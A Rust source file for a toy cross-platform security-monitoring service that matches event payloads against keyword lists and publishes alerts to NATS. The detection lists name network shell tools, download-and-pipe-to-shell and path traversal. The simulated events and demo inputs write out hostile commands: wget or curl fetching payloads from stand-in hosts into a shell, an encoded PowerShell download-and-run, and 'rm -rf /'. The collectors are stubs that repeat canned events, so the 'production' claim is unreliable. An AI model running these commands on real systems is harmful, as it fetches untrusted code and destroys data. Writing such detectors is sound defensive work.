use tokio;
use async_nats as nats;
use serde::{Deserialize, Serialize};
use std::time::{SystemTime, UNIX_EPOCH};

#[cfg(target_os = "windows")]
use windows::Win32::System::Diagnostics::Etw::*;

#[cfg(target_os = "linux")]
use systemd::journal::Journal;

#[cfg(target_os = "macos")]
use core_foundation::runloop::CFRunLoop;

#[derive(Serialize, Deserialize, Debug, Clone)]
struct SecurityEvent {
    timestamp: u64,
    platform: String,
    source_ip: String,
    event_type: String,
    payload: String,
    severity: u8,
    confidence: f32,
    metadata: EventMetadata,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
struct EventMetadata {
    process_name: Option<String>,
    user_id: Option<String>,
    command_line: Option<String>,
    parent_process: Option<String>,
    network_connection: Option<NetworkInfo>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
struct NetworkInfo {
    destination_ip: String,
    destination_port: u16,
    protocol: String,
}

// Cross-platform threat detection
fn detect_universal_threats(event: &SecurityEvent) -> bool {
    // Web application security patterns (universal)
    if detect_web_attacks(&event.payload) {
        return true;
    }
    
    // Command injection patterns (cross-platform)
    if detect_command_injection(&event.payload) {
        return true;
    }
    
    // Suspicious process behavior (platform-specific)
    if detect_suspicious_processes(event) {
        return true;
    }
    
    false
}

fn detect_web_attacks(payload: &str) -> bool {
    let web_patterns = [
        "<script>", "javascript:", "onload=", "onerror=",
        "UNION SELECT", "'; DROP", "/**/", "-- ",
        "../../../", "%2e%2e%2f", "../../../../etc/passwd"
    ];
    
    web_patterns.iter().any(|pattern| {
        payload.to_lowercase().contains(&pattern.to_lowercase())
    })
}

fn detect_command_injection(payload: &str) -> bool {
    let cmd_patterns = [
        "; rm -rf", "&& rm -rf", "| nc ", "; wget ", 
        "; curl ", "$(", "`", "&& wget", "| bash",
        "; powershell", "cmd.exe", "/bin/sh", "/bin/bash"
    ];
    
    cmd_patterns.iter().any(|pattern| {
        payload.to_lowercase().contains(&pattern.to_lowercase())
    })
}

fn detect_suspicious_processes(event: &SecurityEvent) -> bool {
    if let Some(process) = &event.metadata.process_name {
        let suspicious_processes = match event.platform.as_str() {
            "windows" => vec![
                "powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe",
                "regsvr32.exe", "rundll32.exe", "certutil.exe"
            ],
            "linux" => vec![
                "nc", "netcat", "wget", "curl", "python", "perl", 
                "bash", "sh", "/bin/sh", "nmap", "masscan"
            ],
            "macos" => vec![
                "osascript", "python", "ruby", "nc", "wget", "curl",
                "bash", "zsh", "ssh", "scp"
            ],
            _ => vec![]
        };
        
        return suspicious_processes.iter().any(|&suspicious| {
            process.to_lowercase().contains(suspicious)
        });
    }
    false
}

// Platform-specific event collection
#[cfg(target_os = "windows")]
async fn collect_platform_events() -> Result<Vec<SecurityEvent>, Box<dyn std::error::Error>> {
    // Windows ETW/Event Log collection
    let mut events = Vec::new();
    
    // Simulate Windows-specific events
    let event = SecurityEvent {
        timestamp: SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs(),
        platform: "windows".to_string(),
        source_ip: "192.168.1.100".to_string(),
        event_type: "process_creation".to_string(),
        payload: "powershell.exe -enc SGVsbG8gV29ybGQ=".to_string(),
        severity: 4,
        confidence: 0.85,
        metadata: EventMetadata {
            process_name: Some("powershell.exe".to_string()),
            user_id: Some("DOMAIN\\user".to_string()),
            command_line: Some("-enc SGVsbG8gV29ybGQ=".to_string()),
            parent_process: Some("cmd.exe".to_string()),
            network_connection: None,
        },
    };
    
    events.push(event);
    Ok(events)
}

#[cfg(target_os = "linux")]
async fn collect_platform_events() -> Result<Vec<SecurityEvent>, Box<dyn std::error::Error>> {
    // Linux systemd journal, auditd, syslog collection
    let mut events = Vec::new();
    
    // Simulate Linux-specific events
    let event = SecurityEvent {
        timestamp: SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs(),
        platform: "linux".to_string(),
        source_ip: "10.0.0.50".to_string(),
        event_type: "suspicious_command".to_string(),
        payload: "wget http://malicious.com/payload.sh | bash".to_string(),
        severity: 5,
        confidence: 0.92,
        metadata: EventMetadata {
            process_name: Some("bash".to_string()),
            user_id: Some("user".to_string()),
            command_line: Some("wget http://malicious.com/payload.sh | bash".to_string()),
            parent_process: Some("ssh".to_string()),
            network_connection: Some(NetworkInfo {
                destination_ip: "185.220.100.240".to_string(),
                destination_port: 80,
                protocol: "TCP".to_string(),
            }),
        },
    };
    
    events.push(event);
    Ok(events)
}

#[cfg(target_os = "macos")]
async fn collect_platform_events() -> Result<Vec<SecurityEvent>, Box<dyn std::error::Error>> {
    // macOS Unified Logging, FSEvents collection
    let mut events = Vec::new();
    
    // Simulate macOS-specific events
    let event = SecurityEvent {
        timestamp: SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs(),
        platform: "macos".to_string(),
        source_ip: "172.16.0.25".to_string(),
        event_type: "suspicious_script".to_string(),
        payload: "osascript -e 'do shell script \"curl http://evil.com/backdoor\"'".to_string(),
        severity: 4,
        confidence: 0.88,
        metadata: EventMetadata {
            process_name: Some("osascript".to_string()),
            user_id: Some("admin".to_string()),
            command_line: Some("osascript -e 'do shell script \"curl http://evil.com/backdoor\"'".to_string()),
            parent_process: Some("Terminal".to_string()),
            network_connection: Some(NetworkInfo {
                destination_ip: "203.0.113.45".to_string(),
                destination_port: 443,
                protocol: "HTTPS".to_string(),
            }),
        },
    };
    
    events.push(event);
    Ok(events)
}

async fn process_security_events(nc: &nats::Client) -> Result<(), Box<dyn std::error::Error>> {
    println!("🔍 Starting Universal SIEM Core...");
    println!("🖥️  Platform: {}", std::env::consts::OS);
    
    let mut event_counter = 0u64;
    let start_time = SystemTime::now();
    
    loop {
        // Collect platform-specific events
        let events = collect_platform_events().await?;
        
        for event in events {
            if detect_universal_threats(&event) {
                // Publish threat to NATS
                let serialized = serde_json::to_vec(&event)?;
                nc.publish("threats.detected", serialized.into()).await?;
                nc.publish(&format!("threats.{}", event.event_type), serialized.into()).await?;
                nc.publish(&format!("platform.{}", event.platform), serialized.into()).await?;
                
                event_counter += 1;
                
                if event_counter % 10 == 0 {
                    let elapsed = start_time.elapsed().unwrap().as_secs();
                    let rate = if elapsed > 0 { event_counter / elapsed } else { 0 };
                    println!("📊 Processed {} threats | Rate: {}/sec | Platform: {} | Latest: {}",
                        event_counter, rate, event.platform, event.event_type);
                }
            }
        }
        
        // Platform-appropriate sleep
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🚀 Universal Ultra SIEM Core Starting...");
    println!("🌍 Cross-Platform Security Monitoring");
    println!("🖥️  Target Platform: {}", std::env::consts::OS);
    
    // Connect to NATS
    let nats_url = std::env::var("NATS_URL").unwrap_or_else(|_| "nats://127.0.0.1:4222".to_string());
    
    match nats::connect(&nats_url).await {
        Ok(nc) => {
            println!("✅ Connected to NATS at {}", nats_url);
            println!("🔍 Starting platform-specific event collection...");
            
            // Start universal threat processing
            process_security_events(&nc).await?;
        }
        Err(e) => {
            println!("⚠️  NATS connection failed: {} (running in demo mode)", e);
            println!("🔍 Demonstrating cross-platform threat detection...");
            
            // Demo mode with cross-platform examples
            let demo_payloads = [
                // Cross-platform web attacks
                ("<script>alert('Universal XSS')</script>", "web_attack"),
                ("'; DROP TABLE users; --", "sql_injection"),
                
                // Platform-specific command injection
                ("wget http://evil.com/malware | bash", "linux_command_injection"),
                ("powershell -enc aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBzAGMAcgBpAHAAdAAuAHAAcwAxACkA", "windows_powershell"),
                ("osascript -e 'do shell script \"rm -rf /\"'", "macos_applescript"),
                
                // Universal network attacks
                ("../../../../etc/passwd", "path_traversal"),
                ("$(wget http://malicious.com)", "command_substitution"),
            ];
            
            for (payload, attack_type) in &demo_payloads {
                let event = SecurityEvent {
                    timestamp: SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs(),
                    platform: std::env::consts::OS.to_string(),
                    source_ip: "203.0.113.100".to_string(),
                    event_type: attack_type.to_string(),
                    payload: payload.to_string(),
                    severity: 4,
                    confidence: 0.90,
                    metadata: EventMetadata {
                        process_name: None,
                        user_id: None,
                        command_line: None,
                        parent_process: None,
                        network_connection: None,
                    },
                };
                
                if detect_universal_threats(&event) {
                    println!("🚨 THREAT DETECTED: {} on {}", attack_type, event.platform);
                    println!("   Payload: {}...", &payload[..payload.len().min(50)]);
                    println!("   Confidence: {:.2}", event.confidence);
                    println!();
                }
            }
            
            println!("✅ Cross-platform threat detection demonstration completed!");
            println!("🎯 Ready for production deployment on any platform");
        }
    }

    Ok(())
} 